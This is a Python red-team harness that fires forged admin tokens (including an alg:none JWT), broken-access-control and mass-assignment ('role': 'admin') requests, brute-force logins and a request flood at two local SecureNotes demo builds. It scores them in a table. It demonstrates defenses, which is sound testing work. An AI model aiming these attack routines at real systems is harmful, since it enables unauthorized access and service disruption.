"""Red-team harness — fires real attacks at BOTH SecureNotes builds and scores them.

Run the two servers first (see run_demo.py or the README), then:
    python examples/redteam-demo/redteam.py

Every attack is a technique a real attacker uses. The point is the contrast: the same
request that breaches the naive build bounces off the AEGIS build.
"""
from __future__ import annotations

import base64
import json
import urllib.error
import urllib.request

import jwt  # PyJWT — used to forge an alg:none token

VULN = "http://127.0.0.1:8000"
AEGIS = "http://127.0.0.1:8001"


def req(method, url, headers=None, body=None):
    data = json.dumps(body).encode() if body is not None else None
    h = dict(headers or {})
    if data is not None:
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(url, method=method, headers=h, data=data)
    try:
        resp = urllib.request.urlopen(r, timeout=5)  # nosec B310 - fixed localhost target
        return resp.status, {k.lower(): v for k, v in resp.headers.items()}, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, {k.lower(): v for k, v in e.headers.items()}, e.read().decode("utf-8", "replace")
    except urllib.error.URLError as e:
        return 0, {}, str(e)


def login(base, username, password):
    s, _, b = req("POST", f"{base}/login", body={"username": username, "password": password})
    return json.loads(b).get("token") if s == 200 else None


# --- the attacks ------------------------------------------------------------
def attack_forged_token():
    # No account — just fabricate an "admin" token and hit the admin endpoint.
    vuln_tok = base64.b64encode(b"ghost:admin").decode()                       # naive scheme
    aegis_tok = jwt.encode({"sub": "ghost", "aud": "aegis", "iss": "aegis",
                            "roles": ["admin"]}, key="", algorithm="none")     # alg:none forgery
    sv, *_ = req("GET", f"{VULN}/admin/users", {"Authorization": f"Bearer {vuln_tok}"})
    sa, *_ = req("GET", f"{AEGIS}/admin/users", {"Authorization": f"Bearer {aegis_tok}"})
    return row("Forged admin token", sv, sa, breached=lambda s: s == 200)


def attack_broken_access(vuln_bob, aegis_bob):
    # A real, low-privilege user (bob) reaches an admin-only endpoint.
    sv, *_ = req("GET", f"{VULN}/admin/users", {"Authorization": f"Bearer {vuln_bob}"})
    sa, *_ = req("GET", f"{AEGIS}/admin/users", {"Authorization": f"Bearer {aegis_bob}"})
    return row("Broken access control (user->admin)", sv, sa, breached=lambda s: s == 200)


def attack_mass_assignment(vuln_bob, aegis_bob):
    # Sneak a privileged field into a profile update.
    payload = {"display_name": "x", "role": "admin"}
    sv, *_ = req("POST", f"{VULN}/profile", {"Authorization": f"Bearer {vuln_bob}"}, payload)
    sa, *_ = req("POST", f"{AEGIS}/profile", {"Authorization": f"Bearer {aegis_bob}"}, payload)
    return row("Mass assignment (role=admin)", sv, sa, breached=lambda s: s == 200)


def attack_security_headers():
    _, hv, _ = req("GET", f"{VULN}/")
    _, ha, _ = req("GET", f"{AEGIS}/")
    hardened = lambda h: "x-frame-options" in h and "x-content-type-options" in h
    v = "MISSING" if not hardened(hv) else "present"
    a = "PRESENT" if hardened(ha) else "MISSING"
    return ("Clickjacking/sniffing headers", v, a, hardened(hv), hardened(ha))


def attack_brute_force():
    def run(base):
        for i in range(1, 21):
            s, *_ = req("POST", f"{base}/login", body={"username": "alice", "password": f"guess{i}"})
            if s == 429:
                return i
        return None
    lv, la = run(VULN), run(AEGIS)
    v = "NO LOCKOUT (20/20 tried)" if lv is None else f"locked@{lv}"
    a = f"LOCKED after {la}" if la else "NO LOCKOUT"
    return ("Brute-force login (20 tries)", v, a, lv is not None, la is not None)


def attack_flood(n=250):
    def run(base):
        blocked, first = 0, None
        for i in range(1, n + 1):
            s, *_ = req("GET", f"{base}/")
            if s == 429:
                blocked += 1
                first = first or i
        return blocked, first
    bv, _ = run(VULN)
    ba, fa = run(AEGIS)
    v = f"ALL {n} served (no limit)" if bv == 0 else f"blocked {bv}"
    a = f"RATE-LIMITED (~req {fa})" if ba > 0 else "no limit"
    return (f"Request flood ({n} reqs)", v, a, bv > 0, ba > 0)


def row(name, sv, sa, *, breached):
    v = f"BREACHED ({sv})" if breached(sv) else f"blocked ({sv})"
    a = f"BLOCKED ({sa})" if not breached(sa) else f"BREACHED ({sa})"
    return (name, v, a, not breached(sv), not breached(sa))


# --- driver -----------------------------------------------------------------
def main() -> int:
    for base, label in ((VULN, "unprotected :8000"), (AEGIS, "AEGIS :8001")):
        s, *_ = req("GET", f"{base}/")
        if s != 200:
            print(f"! {label} not reachable — start both servers first (see run_demo.py).")
            return 2

    vuln_bob = login(VULN, "bob", "bobs-secret")
    aegis_bob = login(AEGIS, "bob", "bobs-secret")

    rows = [
        attack_forged_token(),
        attack_broken_access(vuln_bob, aegis_bob),
        attack_mass_assignment(vuln_bob, aegis_bob),
        attack_security_headers(),
        attack_brute_force(),
        attack_flood(),
    ]

    width = 92
    print("\n" + "=" * width)
    print("  AEGIS RED-TEAM DEMO  -  same SecureNotes API, two builds")
    print(f"  Target A (naive):  {VULN}\n  Target B (AEGIS):  {AEGIS}")
    print("=" * width)
    print(f"  {'#':<2} {'ATTACK':<36} {'UNPROTECTED':<26} {'AEGIS':<22}")
    print("  " + "-" * (width - 2))
    v_def = a_def = 0
    for i, (name, v, a, vok, aok) in enumerate(rows, 1):
        v_def += vok
        a_def += aok
        print(f"  {i:<2} {name:<36} {v:<26} {a:<22}")
    print("  " + "-" * (width - 2))
    n = len(rows)
    print(f"  DEFENDED:  unprotected {v_def}/{n}    |    AEGIS {a_def}/{n}")
    print("=" * width + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
